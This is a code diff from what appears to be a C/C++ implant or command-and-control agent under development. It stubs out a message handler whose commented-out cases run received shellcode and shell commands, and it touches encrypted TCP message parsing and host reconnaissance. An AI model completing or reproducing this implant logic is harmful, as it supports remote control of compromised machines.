@@ -14,6 +14,8 @@
 // int processIncomingMessage(InternalMessage* msg, Config* config)
 bool MessageHandler::processMessage(InternalMessage* msg) // NOTE: passing the config around is actual cancer... i wish i was writing this in c++
 {
+	return true;
+	/*
 	switch (msg->header.messageType) {
 		case SYS_INFO:
 		{
@@ -22,24 +24,22 @@ bool MessageHandler::processMessage(InternalMessage* msg) // NOTE: passing the c
 
 			// TODO: convert InternalMessage from processMessage into an InternalMessage.payload
 			InternalMessage* response = (InternalMessage *)malloc(sizeof(InternalMessage));
-			memcpy(response->payload, &reconMessage, sizeof(ReconMessage));
+			memcpy(response->data, &reconMessage, sizeof(ReconMessage));
 			response->header.dataSize = sizeof(ReconMessage);
 			//return send(msg->header.message_id);
 			//status |= send(response, config);
 			return status;
 		}
 
-		/*
-		case MSG_TYPE_SHELLCODE:
-			return ExecuteShellcode(payload, header->payload_size);
+		//case MSG_TYPE_SHELLCODE:
+			//return ExecuteShellcode(payload, header->payload_size);
 
-		case MSG_TYPE_CMD:
-			return ExecuteCommand((char*)payload, header->payload_size);
-		*/
+		//case MSG_TYPE_CMD:
+			//return ExecuteCommand((char*)payload, header->payload_size);
 
 		// ... other cases
 	}
-	return false;
+	return false;*/
 }
 
 
@@ -89,6 +89,7 @@ bool MessageHandler::handleTCP(uint8_t* rawData, size_t rawDataLength, InternalM
 
 	// DECRYPT -> Decrypted Bytes
 	// [IV (12 bytes - cleartext)][Ciphertext (encrypted)][Tag (16 bytes - cleartext)]
+	// TODO: this parsing of data should be done in actual decrypt method? or a wrapper for it maybe 
 	const uint8_t* iv = rawData;
 	const uint8_t* ciphertext = rawData + 12;
 	size_t ciphertext_len = rawDataLength - 12 - 16;
@@ -120,6 +121,7 @@ bool MessageHandler::handleTCP(uint8_t* rawData, size_t rawDataLength, InternalM
 	//response->header.payload_size = sizeof(ReconData);
 
 	// TODO: cleanup/free buf
+	return true;
 }
 /*
 int handleHTTPS(uint8_t* data)
